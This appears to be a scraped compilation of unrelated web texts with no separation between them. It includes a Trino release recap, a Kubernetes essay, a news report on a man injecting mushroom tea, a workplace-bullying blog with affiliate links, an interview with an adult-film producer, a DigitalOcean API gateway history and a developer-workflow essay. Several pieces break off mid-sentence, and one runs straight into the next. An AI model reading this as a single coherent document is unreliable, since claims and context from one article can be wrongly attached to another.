<p>The <a href="https://trino.io/docs/current/connector/elasticsearch.html">Elasticsearch connector</a>
received numerous powerful improvements:</p>

<ul>
  <li>Password authentication</li>
  <li>Support for index aliases</li>
  <li>Support for array types, Nested, and IP type</li>
  <li>Support for Elasticsearch 7.x</li>
</ul>

<h2 id="runtime-improvements">Runtime improvements</h2>

<p>Operating and maintaining a Trino cluster takes a significant amount of
resources. So any work to improve the runtime needs have a significant positive
impact:</p>

<ul>
  <li><a href="https://trino.io/docs/current/installation/deployment.html#java-runtime-environment">Requirement to use Java
11</a>, with
better GC performance, overall performance, and improved container
support</li>
  <li>Support for ARM64-based processors to run Trino</li>
  <li>Support for minimum number of workers before query starts, useful for
implementing autoscaling</li>
  <li><a href="https://trino.io/blog/2020/06/25/data-integrity-protection.html">Data integrity checks for network transfers</a> to prevent data corruption during
processing</li>
</ul>

<h2 id="everything-else">Everything else</h2>

<p>There is so much more to capture, and you really would have to read all the
<a href="https://trino.io/docs/current/release.html#releases-2020">release notes</a> in detail to know it
all. To safe you from that, here are a few more noteworthy changes:</p>

<ul>
  <li>Experimental support for materialized views in Iceberg connector</li>
  <li>JDBC driver backward compatibility tests</li>
  <li>Support for multiple event listeners</li>
  <li>Added Python client support for exec with parameters</li>
  <li>New look and navigation for the <a href="https://trino.io/docs/current/index.html">documentation</a>, and
lots of new content</li>
</ul>

<h2 id="community-resources-and-events">Community resources and events</h2>

<p>Beyond the raw code and helping each other, the community collaborated on other
helpful resources like books and in-depth video tutorials.</p>

<p><a href="https://github.com/mattsfuller">Matt</a>, <a href="https://github.com/mosabua">Manfred</a>,
and <a href="https://github.com/martint">Martin</a>  published the book <a href="https://trino.io/presto-the-definitive-guide.html">Presto: The
Definitive Guide</a> with O’Reilly. Over 5000
readers took advantage of the <a href="https://trino.io/blog/2020/04/11/the-definitive-guide.html">free digital copy</a>.</p>

<p>Brian and Manfred launched the live streaming event <a href="https://trino.io/broadcast/index.html">Trino Community

<article>
  <p><em>Pankaj Kumar</em></p>

<p><strong>Encapsulation in Kubernetes</strong></p>

<p>In 2018, for various reasons we moved our website to Kubernetes. When we started, we had little idea what Kubernetes had to offer. All we knew was that it can run a website based on containers that are full OS images. It is easier to move from one cloud provider to another. Cool! Little did we know the biggest advantage it offers: Encapsulation.</p>

<p>The biggest advantage of Kubernetes in my opinion is the encapsulation and composability of backend components. Any Saas product has to run a number of components from database, appserver, monitoring stack, pub/sub etc etc. Kubernetes makes everything a helm chart and some configuration away. The interfaces are neatly defined by the author of the helm chart and all the complexity is encapsulated well within a service. You could use many third party helm charts:
Monitoring: logging - Elasticsearch
Monitoring: metrics - Prometheus
Authentication - FusionAuth
Database - MongoDB
Chaos Monkey - Gremlin
CD - Argo
…
This abstraction of complexity lets every team focus on its unique IP and easily reuse third party components. Now why was it not possible before? VM images were too big, needed a lot of time to boot and it was hard to maintain a lot of them.</p>

<p>Composability is not just limited to third party components. Even your own code becomes very composable with well defined interfaces. Now how should we decide the boundary between two components in a Kubernetes cluster? The same priciples that apply in designing a database or paritioning a program to classes is useful here but with slightly different parameters. When we decide what should go into a class, we use the priciple of loose coupling and strong cohesion: The interface between classes
should be simple and the complexity can be captured inside the class. Also, strong cohesion means methods and properties inside the class should be related to each other: they should change together. A change in behavior should as much as possible be confined within the class.</p>

<p>Choosing the boundary of Kubernetes components depends on a few things apart from the Simplicity of the interface: 
Single process: Everything in one component should run as a single process/container. It should have the same dependencies. You dont really have to worry about this because you pretty much have little choice.
Configurability of the component: IF a configuration change requires the restart of certain parts, they should be in the same component.
Auto-scaling policies for the component. If one component is CPU bound and needs CPU scaling whereas other needs Memory based autoscaling, they should be in different components.
We should strive to decouple state of the containers from the runtime as much as possible, by using databases and volume claims. But ideally one component should not have too many different types of state.</p>

<p>It can also be thought of as taking a UML component diagram and giving each component a container of its own. The concept of components in UML closely resembles an image.</p>

<p>Now, let’s say someday that the component configuration is super easy and the  configuration/maintenance of these components rests in the hands of the creator of the component itself (for a fee of course).  The frontend app developer would go hire some of these backend components, configure them together and a new app is ready to run! The road will not be easy but this will be true low-code where complex services can be built by just knowing UI programming.</p>

		<p>A man brewed a tea from “magic mushrooms” and injected the concoction into his veins; several days later, he ended up at the emergency department with the fungus growing in his blood.</p>
<p>The man spent 22 days in the hospital, with eight of those days in the intensive care unit (ICU), where he received treatment for multisystem organ failure. Now released, he is still being treated with a long-term regimen of antibiotic and antifungal drugs, according to a description of the case published Jan. 11 in the <u>Journal of the Academy of Consultation-Liaison Psychiatry</u>.&nbsp;</p>
<p>The case didn’t reveal whether injecting <u>shroom tea</u> can cause persistent psychoactive effects, as sometimes seen when people ingest the <u>fungus</u> orally, the doctors wrote in the report. For example, in rare cases, people can develop a condition called hallucinogen-induced persisting perception disorder (HPPD), where they experience vivid flashbacks of their trip long after the fact, <u>according to the National Institute on Drug Abuse</u>.&nbsp;</p>
<p>The case “underscores the need for ongoing public education regarding the dangers attendant to the use of this, and other drugs, in ways other than they are prescribed,” the doctors wrote.&nbsp;</p>

<p>By injecting shrooms into his bloodstream, the 30-year-old patient had hoped to relieve symptoms of bipolar disorder and opioid dependence, according to the report. His family members noted that he had recently stopped adhering to his prescribed bipolar medications and was “cycling between depressive and manic states.”&nbsp;</p>
<p>The man found online reports that described the potential therapeutic effects of hallucinogens, such as <u>LSD</u> and psilocybin mushrooms, which prompted him to boil down shrooms into a “mushroom tea.” He filtered the tea by drawing it through a “cotton swab” before injecting it into his body. In the following days, he became lethargic and nauseated, and his skin began to yellow. He soon developed diarrhea and began vomiting blood.&nbsp;</p>
<p>His family found him and took him to the emergency room, noting concern that he also seemed very confused. The doctors noted that he could not participate in a meaningful interview, due to his altered mental state. Multiple organs, including the liver and kidneys, began to fail and the man was transferred to the ICU. His blood tested positive for a <u>bacterial</u> infection with the microbe <em>Brevibacillus </em>and a fungal infection from <em>Psilocybe cubensis </em>— meaning the magic mushroom he injected was now growing in his blood.</p>
<p>In addition to antibiotic and antifungal drugs, the man needed to be placed on a ventilator after he experienced acute respiratory failure, where fluid builds up in the air sacs of the lungs. Thankfully, the patient survived this ordeal and was later discharged from the hospital.</p>
<p>—Psychiatry’s new guide: 6 things you should know</p>
<p>—10 of the strangest medical studies (in recent history, that is)</p>
<p>—Hypersex to hoarding: 7 new psychological disorders&nbsp;</p>
<p>Research suggests that psilocybin may be a promising treatment for <u>depression</u>, <u>anxiety</u> and substance abuse, the authors noted — but only if taken safely. In most research studies, scientists administer the drug in pill form, but in a few instances, doctors have delivered psilocybin via an intravenous injection, according to a 2018 report published in the journal <u>Neuropharmacology</u>. But these injections are given in tightly controlled doses and under medical supervision, and they do not contain any fungi; the compound psilocybin, alone, is not alive and cannot grow in the body.</p>
<p>When used recreationally, magic mushrooms are typically made into a tea, eaten raw or dried, ground into a powder and put in capsules, or coated in chocolate — they are not injected directly into the bloodstream. Shrooms induce mind-altering trips by interacting with certain receptors in the brain; specifically, the psilocybin breaks down into psilocin, a substance that acts like the brain chemical serotonin, which plays roles in mood and perception.</p>
<p>But a bad trip can trigger anxiety, fear and confusion, as well as elevated blood pressure, vomiting, headaches and stomach cramps, <u>Live Science previously reported</u>. Magic mushrooms carry an added risk because they resemble some species of poisonous mushroom, so people sometimes consume the wrong kind by mistake.&nbsp;</p>
<p>Several U.S. cities have decriminalized psilocybin, and in November 2020, Oregon moved to legalize its use as a therapeutic drug, <u>CNBC reported</u>. As of now, psilocybin is still classified as a “Schedule I substance” under federal law, meaning that the drug has no accepted medical use in the U.S. and has a “high potential for abuse.” However, current research suggests that this potential for abuse has been historically overestimated and is actually quite low, according to the 2018 Neuropharmacology report.&nbsp;</p>

                <p>A workplace bully negatively affects everyone.&nbsp;Workplace Bullies are always bad for business. The workplace bully is around because the company condones and rewards him or her.&nbsp;According to Sarah Tracy, director of the Project for Wellness and Work-Life at Arizona State University, “There are a number of workplace cultures that encourage bullying because of high levels of competition.” However, that’s not the only reason for workplace bullying. It’s also a pretext for all types of workplace discrimination.&nbsp;Hello, I’m Yancey with vivid memories of Darrell towering over us in the fourth grade! He would line us up every morning and take our lunch money.</p>
<p>I remember going home and crying to my mother about it thinking I was going get empathy. She “cleaned my clock” and said “Don’t you let that boy take your lunch money. I’ll call your teacher to make sure”. Now I was in a real jam. I had to decide who I was most afraid of Darrell or mom. Well the next morning I stood my ground, fought and got beat up, but kept my lunch money. After that I never had any more problems with Darrell. Standing up to bullies in the workplace can be just as frightening for some bully victims. Bullying on the job can take many forms. These can include…</p>
<ul>
<li>psychological abuse</li>
<li>physical abuse</li>
<li>emotional abuse</li>
<li>verbal and non verbal abuse</li>
</ul>
<p>The bully may attempt to manipulate or destroy the victims work product. According to Wikipedia, <a href="https://www.e-junkie.com/ecom/gb.php?cl=140727&amp;c=ib&amp;aff=82668">workplace bullying</a>, “is the tendency of individuals or groups to use persistent aggressive or unreasonable behavior against a co-worker”. I would have to expand on that definition because I have personally witnessed employees bullying other employees, customers, vendors, visitors and other interested parties as well! I have also several individuals attempt to bully me on the job.&nbsp;Bullies unfortunately, are a part of society in general.&nbsp;A lot of times office bullies use or pervert their power in the workplace. The bully tactics include<br>
degrading, humiliating, insulting, affronting and intimidating the “target” of their abuse.</p>
<p>Many times this behavior is done in front of witnesses designed to destroys an individuals self esteem. In a bullying workplace trust is nonexistent especially when management allows or approves it. When employees or supervisors are aware of workplace bullying and do nothing to correct it they share in the negative consequences. Witnesses should be empowered to report such behavior and organizations must punish the “bully”. Unfortunately, the office bully is often the supervisor or manager. When there is an environment of distrust in the workplace, employees may not be willing to do their best and moral will be low. Studies show about a third of American workers have been exposed to <a href="https://www.e-junkie.com/ecom/gb.php?cl=140727&amp;c=ib&amp;aff=82668">workplace bullies</a>!</p>
<p>My first day in local government as an IT (information technology) professional was a dazzling display of workplace bullying. The supervisor after my orientation made this statement. “_____ is going to be training you. He’s upset because I got this job and he didn’t.” I thought that was a very curious statement for him to make.&nbsp;He then told me to go take a seat in the work area with this individual to start my training. From that point on for fully nine months I was exposed to behaviors like this. “Excuse me __________, what does this system message mean?” The individual sitting four feet from me ignored me as if I didn’t exist.</p>
<p>A female co-worker said, “He does that to me all the time.” Have you told the supervisor about this, I asked. She said the supervisor was aware of it. The female coworker had been employed there about three months before I got there.&nbsp;The department bully did everything he could to hinder our training and development. When the female co-worker and I would in essence train ourselves the bully would make loud comments to make us look stupid or incompetent. When asked about a specific job task he yelled, “That’s really complicated computer stuff, you wouldn’t understand it!” The bully, a white male made that statement to a person of a different ethnicity. Now the bully had crossed over into ethnic harassment territory. Again when management was given notice it did nothing to correct the situation.</p>
<p>I was thoroughly mystified at the blatant level of arrogant indifference management displayed in response to this employee. I was to learn later, the employee had a history of bullying individuals in and outside the department. These included&nbsp;other employees, managers, vendors, sales people and elected officials.&nbsp;Remember, I’m talking about the local government of a mid-sized U.S. city! Never in my previous thirty plus years in the American workplace have I ever experienced and witnessed a greater example of what a bully in the workplace looks like! According to some researchers the following are most common tactics used by bullies in the workplace…</p>
<ul>
<li>falsely accusing the target(s) of workplace mistakes</li>
<li>the silent treatment</li>
<li>yell at the target(s) with the intent to intimidate</li>
<li>make insults based on race, gender, disability, national origin,etc.</li>
<li>characterize the target as incompetent or unintelligent</li>
<li>trivialize the target(s) work product</li>
<li>demean the target(s) in front of others</li>
</ul>
<p>The bully in my former workplace has displayed all of these tactics and more!</p>
<p>Bullies come in all shapes and sizes in the workplace. In my opinion the greater the insecurity the greater the need for control. “<a href="https://www.e-junkie.com/ecom/gb.php?cl=140727&amp;c=ib&amp;aff=82668">workplace terrorists</a>“, my name for them, are all about control. They come in four basic types:</p>
<p><strong>yellers</strong> – This kind of bully has to always talk over or down to the target(s).</p>
<p><strong>blockers</strong> – This type is great for slamming or trying to destroy the good work product of the target. He or she will also seek to undermine the reputation of the target as well.</p>
<p><strong>backstabbers</strong> – This classic office bully works in the shadows spreading ugly rumors, gossip and setting up traps against the target.</p>
<p><strong>nitpickers</strong> –&nbsp; This bully loves to find fault with everything the target does no matter how trivial. This type of bully will have negative criticism with any ideas the target suggests.</p>
<p>There are consequences for organizations fostering a culture of workplace bullying.&nbsp;Several studies reveal that job bullying resulting in psychological, physical and emotional abuse happens in all types of companies and organizations. Employees who are targets of intense bullying can develop…</p>
<ul>
<li>high levels of stress disorder</li>
<li>insomnia</li>
<li>strokes</li>
<li>migraine headaches</li>
<li>suicidal tendencies</li>
<li>low self esteem</li>
<li>depression</li>
<li>heightened risk of heart disease</li>
</ul>
<p>A national poll conducted by the Workplace Bullying Institute says 37 percent or 54 million American employees have or are being bullied in their employment. “Anything that affects 37 percent of the public is an epidemic. But, it’s a silent epidemic” according to Gary Namie Director of the Workplace Bullying Institute.&nbsp;Suzy Fox of Loyola of Chicago’s Institute of Human Resources and Employment Relations states, “since there aren’t laws to enforce anti-bullying workplaces, businesses should develop organizational policies that strictly outline behavior that is not acceptable in the office.” Fox further states, workplaces are “very similar to where we were with sexual harassment 15 years ago before there policies…and court decisions.”</p>
<p>Workplace bullying can also manifest into what’s called “mobbing”.&nbsp; This form of bullying at work involves being bullied by two more people per attack. Employees who are subjected to witnessing a bully in action against a co-worker have increased levels of stress and low morale.&nbsp;Since there are no federal laws against workplace bullying many companies do little or nothing about.&nbsp;But, like sexual harassment handling bullies is getting more attention because it’s proving to be bad for business.&nbsp;Because there are no laws in place, there is no clear definition of what <a href="https://www.e-junkie.com/ecom/gb.php?cl=140727&amp;c=ib&amp;aff=82668">workplace bullying</a> is. That means it can be hard to distinguish from other behaviors such as retaliation, sexual and racial harassment.</p>
<p>Harassment by definition is offensive or unwelcome conduct that adversely affects an individual’s condition of employment.&nbsp;Harassment is linked to individuals in a protected classes such as…</p>
<p>race (ethnicity)</p>
<p>national origin</p>
<p>gender</p>
<p>disability</p>
<p>religion</p>
<p>In my opinion, the lines are blurred in the absence of a legally defined law concerning bullying in the workplace. I have witnessed and experienced individuals on the job who have exhibited various forms of harassment.&nbsp; How can harassment and hostility be directed toward any individual in the workplace and not also meet the standard for being a bully?&nbsp;Up to this point the federal government has no job bully laws. Businesses and organizations don’t have uninform policies to prevent and punish it. According to Wikipedia the U.S. has yet to pass comprehensive workplace bullying legislation nor has any state government. Legislatures in 29 states have introduced&nbsp;workplace anti-bullying bills&nbsp;in recent years, according to the Healthy Workplace Campaign.</p>
<p>Companies that have an environment encouraging bullying as an accepted business practice become corporate or institutional bullying. Some experts believe the constant growth of the economy over the last 20 years is partly to blame.&nbsp;Employers promoted individuals into management positions who were not qualified with no interpersonal skills or training because these jobs were hard to fill.&nbsp;Businesses that encourage bully bosses have high employee absenteeism and turnover. Research also shows increased levels of stress and sick leave taken. Who can blame them? There have been many instances when I didn’t want to go to work because of the bully in my workplace. I never allowed the individual to&nbsp; intimidate me, however the workplace had a poisonous negative atmosphere that was nurtured and condoned by …</p></div></div></div></div></section></div></div>

<p><strong>This is The <a href="https://www.therialtoreport.com/">Rialto Report</a>‘s interview with Beau Buchanan.</strong></p>
<p>___________________________________________________________________________________</p>
<h2><span><strong>1. &nbsp; &nbsp; Beau Buchanan – Beginnings:</strong></span></h2>
<p><strong>You lived and worked in New York for all of your adult film career, but you’re not from New York?</strong></p>
<p>That’s right. My life started in California when I was born November 22, 1937.</p>
<p><strong>Were you interested in movies from an early age?</strong></p>
<p>Actually, ever since I can remember, as a kid, I wanted to be an actor. I wrote and performed plays in the basement of our house when we were young. As I grew older, I auditioned for parts in plays. Not just in California either: I worked in a stock company in Mexico when I was 12, and later my sister and I had roles in the off-Broadway production of ‘The Innocents.’</p>
<p>Then I was in a production of ‘Oedipus Rex.’</p>

<p><strong>Did you get any acting roles in films?</strong></p>
<p>Yes, several. My first movie role was in the MGM film <a href="https://www.imdb.com/title/tt0047885/reference">Blackboard Jungle</a> (1955), which turned out to be a big hit. It was about an interracial inner-city school, and <a href="https://www.imdb.com/name/nm0112218/">Richard Brooks</a> was the director. He visited schools in Los Angeles in 1954 to cast the roles of the kids, and I got a small featured part in it. Nowadays it’s best known for the rock and roll soundtrack and also because it had a black actor, Sidney Poitier, in a lead role.</p>
<p>The casting agent said they wanted everybody to be over 18 when the film was shot. I was 16 and he asked me how old I was. I said, “I’ll be 18 in November” which was not a lie: it just wasn’t November that year. I spent a lot of time being tutored on set in between the acting.</p>

<p><strong>What was it like to be part of such a successful film?</strong></p>
<p>It was really tremendous because the film broke all records and it was a big surprise. When it opened, I was on an anthropological expedition in Guatemala, and when I came out of the jungle my friends called and told me, “The film is just breaking all the records and people are dancing in the aisles.”</p>
<p>It was great: I met Sidney Poitier, Glenn Ford and Vic Morrow.</p>
<p><strong>Did you continue acting after that?</strong></p>
<p>I did some acting here and there. I did some directing too. I taught theater at a school, and then I became interested in working in television. The problem was that none of these jobs paid much, and as much as I liked film, I always liked to make money too. I was entrepreneurial, and so I had a number of businesses – like a parking business, and I was an excavator and grading contractor too!</p>

<p><strong>How long did you stay in California?</strong></p>
<p>In the late 1960s, I moved up to Seattle. I had a business failure, and I lost a lot of money. I was completely broke, so I decided to move to Australia to get away from everyone. But in the end I stayed, and moved to Seattle.</p>
<p>In Seattle, I worked at a local TV station. There were two films companies in town and I got a job offer from both of them the same day. But I stayed freelance because I wanted to be independent – that stayed with me my whole life. I always worked for myself.</p>
<p>The guys at the TV station would say, “Beau, why don’t you come onto our staff? Then if things slow down, you’ll still have a job.” I said, “If things slow down, I don’t want to be here!”</p>
<p><strong>Being freelance meant you had more flexibility for whom you worked?</strong></p>
<p>Yes. For example, I worked on a film that won an Academy Award. It was an environmental documentary called <a href="https://archive.org/details/theredwoods">The Redwoods</a>. The film was made as part of a campaign for a national park to protect the redwood forests.</p>
<p><strong>What did you learn from your time at the TV station?</strong></p>
<p>It was a great opportunity because I worked with really, really talented film people. I got to do everything – from sweeping floors to directing, editing, shooting, and lighting. I even became an animator when I had an argument with the animator. He said, “Screw you, do it yourself” so I did!</p>
<p>I also worked as a technician on many films sets, including a few that were starting to do more risqué adult films.</p>
<p>*</p>
<h2><strong><span>2.&nbsp;&nbsp;&nbsp;&nbsp; Pornography in New York (1972)</span></strong></h2>
<p><strong>How did you end up in New York?</strong></p>
<p>I went to New York in 1969 looking for independent film work. By now, I was an experienced crew member, generally as a grip, best boy, or gaffer. I’d basically take any work that I could find, but since I was non-union and new to town, I found fewer opportunities. Many low budget films were sex films at that time… that’s how I got into it.</p>
<p><strong>What do you remember about the early X-rated scene in New York in the early 1970s?</strong></p>
<p>It was more than just a film movement. It was a rebellion. We wanted change, we wanted to do something different, and this was an opportunity. It was fun. We made it all up as we went along, we established the rules.</p>
<p>When I encountered the consensus that we couldn’t do something, I would look for a way to do it anyway – just to prove that our generation had no boundaries. Sometimes it was a technical question: for example, when I was working in Seattle for the TV station, they’d say, “You can’t use a strobe light.” That made me say, “Why not? Let’s try it and see what happens.”</p>
<p>In my case, I was excited because I could do everything. I could actually go out and make it happen.</p>
<p><strong>Were you surprised by the sexual permissiveness in films?</strong></p>
<p>Yes. It was a daring time, and I’m sure that people were attracted to it because of that.</p>
<p>I remember the actress <a href="https://www.therialtoreport.com/2020/02/09/deep-sleep-3/">Kim Pope</a> on one of the first film sets in New York. She used to be a teacher, and so she used a different name. She was there with her boyfriend, and he had no concerns about the fact that she was about to perform in a sex scene with a guy she’d never met.</p>
<p>That was all new to me.</p>

<p><strong>What was your impression of New York at the time?</strong></p>
<p>New York was always this tremendous pool of energy. There were a couple of times when I was essentially broke in New York in the early days – but there was always something you could do. It was such an exciting, dynamic place.</p>
<p>California had its own energy but it was much less than New York. Even when I was down and nearly out in the city, I would go scavenging on the streets and find some nice furniture that people just didn’t have room for.</p>
<p><strong>What do you remember about the people who worked on adult film sets?</strong></p>
<p>There were really some good, talented people that worked on the films, but they just couldn’t get a job in the mainstream movie world because there wasn’t enough work. So this was an opportunity to do something. This was an opportunity to make some money.</p>
<p>It was the first time in history that people were making explicit sex films on a regular basis…</p>
<p><strong>Did that lead to any unusual situations?</strong></p>
<p>I remember shooting heterosexual sex films for a director who was gay. His producer happened to be a psychiatrist, and so this psychiatrist handed out drugs to anyone on set who wanted them. On one occasion, we’d almost finished the shoot, but the lead actor wasn’t able to get it up because he’d taken so many pills. So the producer offered a bonus, $50, to the first guy who could step in, get it up, and finish the shot. It was kind of funny to see these crew members standing around whacking off in competition to see who could do the scene.</p>
<p><strong>Do you remember any directors in particular?</strong></p>
<p>My first movie was for <a href="https://www.imdb.com/name/nm0457046/">Leonard Kirtman</a>. He gave a start to many aspiring filmmakers. He didn’t pay well, in fact he paid nothing, but you could learn a lot.</p>
<p>Lenny Kirtman was a phenomenon; he had this building, a three-story brownstone, on the Upper West Side in the 70s, and he would shoot 60 minute softcore films. He’d shoot three each weekend, and they’d be shot at the same time in different rooms. He’d go from room to room, change the bed, move the furniture around, and then shoot another scene.&nbsp; The movies would have a very loose kind of storyline, and he’d hire first-time people to appear in or work on the films. They probably didn’t realize that they were appearing in three different films! They had no idea. It didn’t matter. The performers didn’t really care what the storyline was, there wasn’t enough storyline to require a script. I think his budgets for films were something like $1,500…</p>
<p>But Leonard was a massive producer of these very low budget films. Later on, he moved away from softcore features to shoot hardcore films. But in my first New York years, he was king of the early sex film business in New York.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>TL;DR: this is mostly a text version of a presentation I’ve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean’s API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one “monolith library” that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn’t ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn’t match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn’t just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter’s Finagle) wasn’t an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn’t be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Calçado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn’t be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We’d augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it’s routing table. It would perform basic health checking and remove destinations that weren’t reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java’s Servlet API or Ruby’s Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn’t we pick something that existed? Fair question. There really weren’t many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby’s serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we’d have to write this session decrypting and parsing logic in Lua scripts we’d bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn’t robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two “filters” we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by “doing” the filter work for both monoliths but not acting on them, we’d check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we’d log that and work on figuring out why it didn’t work.</p>

<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn’t run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren’t exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you’re working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn’t have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang’s http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn’t know what it was until we checked their configs and noticed they just didn’t set a value (while we did have a max timeout for all requests on our end, so we’d close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn’t ideal. There was very little validation in place and it was super simple for people to register routes that wouldn’t load or that wouldn’t really route anything due to being incomplete. …</p></div></div>

    <h3>how we create and deliver software</h3>

    <p>Perhaps this is the part of the essay where you expect me to go on a rant about the merits of <a href="https://dhh.dk/arc/000074.html">strong typing</a>, the deficiencies of ORMs, or the <a href="https://xkcd.com/1597/">inscrutability of Git commands</a>.</p>

    <p>But on the contrary, I think we're in a golden age for programming languages, library ecosystems, and development environments.</p>

    <p>Consider:</p>

    <ul>
      <li><p>Beautiful and expressive syntaxes like Ruby, Python, Go, Rust, React, SQL, Swift, and HTML/CSS</p></li>
      <li><p>Code editors like vim, Sublime, Xcode, and VS Code</p></li>
      <li><p>Collaboration tools like GitHub, Slack/Discord, and Zoom/screenshare</p></li>
      <li><p>Self-learning resources ranging from Stack Overflow to YouTube educators and Twitch programming live streams</p></li>
    </ul>

        <p>Watching developers build software in realtime is a blessing of the Twitch and YouTube era. Image from <a href="https://medium.com/@suzhinton/live-coding-stream-some-news-a09bb6d15ef1">Suz Hinton</a></p>

    <p>Where I see the potential for improvement in software creation is developer workflows.</p>

    <p>Computing is at its best when it’s fun, fast, and ceremony-free. The user (or developer) can focus on what they want to get done with a minimum of steps and fussy errors. Compare a smartphone to a desktop computer in terms of those qualities. What's the equivalent of a smartphone-like experience for development?</p>

    <p>Three workflow improvments I’ll talk about here:</p>

    <ol>
      <li><p><strong>Joining a project.</strong> If I invite another developer to edit my software, how fast and easy for them to run the project within a development environment and make their first change?</p></li>
      <li><p><strong>Seeing changes.</strong> How much time elapses between me making a code change and seeing the result of that change in its native context?</p></li>
      <li><p><strong>Publishing to users.</strong> Once I have a change working the way I want in my dev environment, how long does it take to publish that change to one or more of my users?</p></li>
    </ol>

    <p>Taking each in turn…</p>

